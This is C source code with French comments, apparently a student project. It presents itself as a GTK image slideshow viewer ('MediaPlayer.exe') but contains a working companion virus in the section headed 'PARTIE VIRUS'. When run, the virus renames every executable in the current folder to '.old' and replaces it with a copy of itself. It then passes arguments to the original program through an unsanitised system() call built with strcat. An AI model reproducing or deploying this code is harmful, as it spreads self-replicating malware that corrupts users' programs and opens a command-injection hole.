    #include <gtk/gtk.h>
    #include <gdk-pixbuf/gdk-pixbuf.h>
    #include <dirent.h>
    #include <string.h>

    #include <stdio.h>
    #include <stdlib.h>

    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>


    char** mediaList = NULL;
    int nbrMedia = 0;
    int curIndex = 0;

    static gboolean timer_is_start = FALSE;

//Widget GTK
    GtkWidget *mainWindow = NULL;
    GtkImage *imageViewer = NULL;
    GtkLabel *labelURL = NULL;
    GtkButton *buttonPrecedant = NULL;
    GtkButton *buttonLecture = NULL;
    GtkButton *buttonSuivant = NULL;
    GtkButton *buttonRepertoire = NULL;


    float maxW = 400;
    float maxH = 400;


/*
======================================================================================================
                                      PARTIE MEDIA PLAYER
======================================================================================================
*/


//Retourne True si la string str se termine avec la string end
    int string_end_with(const char *str, const char *end){
      size_t len_str = strlen(str);
      size_t len_end = strlen(end);

      return strncmp(str + len_str - len_end, end, len_end) == 0;
    }

//Affichage d'une image
    void display_image(const char * url){
      GdkPixbuf* pixbuffer = gdk_pixbuf_new_from_file(url, NULL);
      float preW = gdk_pixbuf_get_width(pixbuffer);
      float preH = gdk_pixbuf_get_height(pixbuffer);

      float diffW = maxW - preW;
      float diffH = maxH - preH;
      float ratio = (diffW > diffH) ? maxH/preH : maxW/preW; //Meilleur ratio pour la nouvelle image

      //Calcul des nouvelles dimmensions avec le ratio
      int newW = preW*ratio;
      int newH = preH*ratio;

      pixbuffer = gdk_pixbuf_scale_simple(pixbuffer,newW, newH,GDK_INTERP_BILINEAR);
      gtk_image_set_from_pixbuf(imageViewer, pixbuffer);
    }


//Vide la liste des images
    void clear_list_medias(){
      if(mediaList != NULL){
        for(int i = 0; i < nbrMedia; i++)
          free(mediaList[i]);

        free(mediaList);
        mediaList = NULL;
      }
      curIndex = 0;
    }

//Parcours la liste des fichiers images dans le repertoire 'homedir' et passe les images en parametre de la fonction func
    void execute_parcours_fichier(const char * homedir, void (*func)(char *)){
      DIR *d;
      struct dirent *dir;
      d = opendir(homedir);
      while ((dir = readdir(d)) != NULL) {
        if(string_end_with(dir->d_name, ".jpg") || string_end_with(dir->d_name, ".png")){ //Test si le fichier est une image
          func(dir->d_name);//Traitement de l'image
        }
      }
      closedir(d);
    }


//Change la liste des images
    void update_files(const char* homedir){
      nbrMedia = 0;
      clear_list_medias(); //On vide la liste

      int ind = 0;
      int homedirlen = strlen(homedir);

      //Fonction qui ajoute l'image passée en parametre à la liste des images
      void url_add_func( char * c) {
        mediaList[ind] = (char * )malloc(sizeof(char ) * ((homedirlen + 1 +strlen(c)) +1));
        sprintf(mediaList[ind], "%s/%s", homedir, c);
        ind++;
      }

      int mediaIndTemp = 0; // On modifie mediaIndTemp et non pas nbmedia car crash si update view en même temps
      void add_func(char * c) {mediaIndTemp++;} //Fonction qui va servir à compter les images du repertoire

      execute_parcours_fichier(homedir,add_func); //On execute la fonction qui compte le nombre d'image
      mediaList =(char**) malloc(sizeof(char *) * mediaIndTemp ); //On alloue dynamiquement la mémoire en fonction du nombre d'image
      execute_parcours_fichier(homedir, url_add_func); //On reparcours les images pour les ajouter à la liste

      char *urlDisplay = (char*)malloc(sizeof(char * )*256);
      sprintf(urlDisplay, "%s/       : %d medias\n", homedir, mediaIndTemp ); //Affichage de l'URL
      gtk_label_set_text(labelURL, urlDisplay );
      free(urlDisplay);

      nbrMedia = mediaIndTemp;

      if(nbrMedia>0){
        display_image(mediaList[curIndex]); //Affichage de l'image 0
      }
    }

//Callback lors du clique pour changer de repertoire
    static void change_repertoire(GtkButton *click_button, gpointer data){
      GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_SELECT_FOLDER;
      gint res;

      GtkWidget* dialog = gtk_file_chooser_dialog_new("Choisir repertoire contenants les medias", GTK_WINDOW(mainWindow), action,
                      "_Cancel", GTK_RESPONSE_CANCEL,
                       "_Open", GTK_RESPONSE_ACCEPT, NULL);

      GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
      gtk_file_chooser_set_current_folder(chooser, "./");

      res = gtk_dialog_run(GTK_DIALOG(dialog));

      if (res == GTK_RESPONSE_ACCEPT)
      {
        char *homedir;
        homedir = gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
        update_files(homedir); //Changements de la liste d'image
        g_free (homedir);


      }

      gtk_widget_destroy (dialog);

    }

//CallBack image suivante
    static void suivant(GtkButton *click_button, gpointer data){
      if(nbrMedia > 0){
        curIndex = (curIndex + 1)%nbrMedia;
        display_image(mediaList[curIndex]);
      }
    }

//Callback image precedante
    static void precedant(GtkButton *click_button, gpointer data){
      if(nbrMedia > 0){
        curIndex = (curIndex - 1);
        if(curIndex < 0){
          curIndex = nbrMedia - 1;
        }
        display_image(mediaList[curIndex]);

      }
    }



//Gestion du changement de taille de la fenetre
    void update_size(GtkWidget *widget, GdkEvent *event, void *data) {
      GtkAllocation* alloc = g_new(GtkAllocation, 1);
      gtk_widget_get_allocation(mainWindow, alloc);

      //on recupere les nouvelles dimmensions max
      float maxWTemp = alloc->width -350.0;
      float maxHTemp = alloc->height  -350.0;

      g_free(alloc);
      //Ce callback n'est pas appellé qu'en cas de changement de taille de la fenetre donc :
      if(maxH != maxHTemp || maxW != maxWTemp){ //Si il y a eu un changement de taille de la fenetre
        maxH = maxHTemp;
        maxW = maxWTemp;
        if(nbrMedia>0){
          display_image(mediaList[curIndex]); //On redessine les images (avec nouvelles dim)
        }
      }
    }


    //Image suivante à la fin du timer (Diapo)
    static gboolean timer_update(gpointer data){
      if(timer_is_start){
        suivant(NULL, NULL);
      }

      return timer_is_start;
    }

    //Callback mode lecture ou mode pause
    static void lecture(GtkButton *click_button, gpointer data){
      timer_is_start = !timer_is_start;

      if(timer_is_start){
        gtk_button_set_label (click_button, "PAUSE");
        g_timeout_add_seconds(3, timer_update, NULL);
      }else{
        gtk_button_set_label (click_button, "PLAY");
      }


    }

    static void init_widget(GtkBuilder* builder){
      mainWindow = GTK_WIDGET(gtk_builder_get_object (builder, "MainWindow"));
      imageViewer = GTK_IMAGE(gtk_builder_get_object(builder, "imageViewer"));
      labelURL = GTK_LABEL(gtk_builder_get_object(builder, "labelURL"));
      buttonPrecedant = GTK_BUTTON(gtk_builder_get_object(builder, "buttonPrecedant"));
      buttonLecture = GTK_BUTTON(gtk_builder_get_object(builder, "buttonLecture"));
      buttonSuivant = GTK_BUTTON(gtk_builder_get_object(builder, "buttonSuivant"));
      buttonRepertoire = GTK_BUTTON(gtk_builder_get_object(builder, "buttonRepertoire"));

      g_signal_connect (G_OBJECT (mainWindow), "destroy", (GCallback)gtk_main_quit, NULL);

      g_signal_connect(buttonPrecedant, "clicked", G_CALLBACK(precedant),NULL);
      g_signal_connect(buttonLecture, "clicked", G_CALLBACK(lecture), NULL);
      g_signal_connect(buttonSuivant, "clicked", G_CALLBACK(suivant), NULL);
      g_signal_connect(buttonRepertoire, "clicked", G_CALLBACK(change_repertoire), NULL);

      g_signal_connect(G_OBJECT(mainWindow), "size-allocate", G_CALLBACK(update_size), NULL);

    }



//Lancement du media player
  int start_media_player(int *argc, char**argv[]){
      GtkBuilder *builder = NULL;
      GError *error = NULL;
      gchar *mainAppFile = NULL;

      gtk_init(argc, argv);
      builder = gtk_builder_new();
      mainAppFile =  g_build_filename ("glade_ui/imageViewer.glade", NULL);
      gtk_builder_add_from_file (builder, mainAppFile, &error);
      g_free (mainAppFile);

      if (error)
      {
        gint code = error->code;
        g_printerr("%s\n", error->message);
        g_error_free (error);
        return code;
      }

      init_widget(builder);
      gtk_widget_show_all (mainWindow);

      update_files(".");

      gtk_main();

      return 0;
    }

/*
======================================================================================================
                                            PARTIE VIRUS
======================================================================================================
*/

//Retourne vraie si le fichier est infecté (possede un .old ou est .old)
    int est_infecte(const char * file){
      if(string_end_with(file, ".old")){
        return 1;
      }
      //On recherche si il existe un .old
      char path[270] = "";
      sprintf(path, "%s.old", file);
      struct stat statFile;
      return stat(path,&statFile)==0;

    }

//Retourne vrai si le fichier est executable par l'utilisateur
    int est_executable(long mode){
      return ((mode&S_IFMT)==S_IFREG) && ((mode&S_IXUSR)==S_IXUSR);
    }

//Fonction pour dupliquer un executable
    void duplicate_file(const char * fileSource, const char* fileDest){
      FILE *source = fopen(fileSource, "rb");
      FILE *dest = fopen(fileDest, "wb");
      unsigned char buf[4096];
      int n;
      while ((n=fread(buf, 1, 4096, source)) > 0) {
        fwrite(buf,n, 1, dest );
      }
      fclose(source);
      fclose(dest);
    }

//Fonction qui lance le processus d'infection d'un fichier cible
    void infect(const char * file, const char * thisProg){
      char newFile[270] = "";
      sprintf(newFile,"%s.old", file);
      rename(file, newFile); //On copie vers .old


      duplicate_file(thisProg, file); //On duplique ce programme
      struct stat statFile;
      stat(file,&statFile);
      chmod(file, statFile.st_mode|S_IXUSR); //On rend le nouveau programme executable


    }

//Fonction coeur du virus, analyse et lance les infections
    void virus(const char * actualProg){
      //PARCOURS FICHIERS
      DIR *d;
      struct dirent *dir;
      d = opendir(".");

      struct stat sb;

      while ((dir = readdir(d)) != NULL){
        stat(dir->d_name, &sb);
        if(!string_end_with("MediaPlayer.exe", dir->d_name)){//Si ce n'est pas le programme actuellement executé
          if(est_executable(sb.st_mode) && !est_infecte(dir->d_name)){ //Si est executable et pas infecté
            infect(dir->d_name, actualProg); //On infecte
          }
        }
      }
      closedir(d);
    }


//Fonction main
    int main(int argc, char *argv [])
    {

      virus(argv[0]); //Execution de la partie virale

      //Execution du programme
      if(string_end_with(argv[0], "MediaPlayer.exe")){ //Si le nom est mediaPlayer, on lance le player
        return start_media_player(&argc,& argv);
      }else{//Sinon on lance le programme .old
        char prog [530] = "";
        sprintf(prog, "%s.old", argv[0]);

	for(int i = 1; i < argc; i++){
    strcat(prog, " ");
    strcat(prog, argv[i]);
		//sprintf(prog, "%.255s %.100s",prog, argv[i]);//Ajout des arguments
	}
        system(prog);
      }


      return 0;
    }
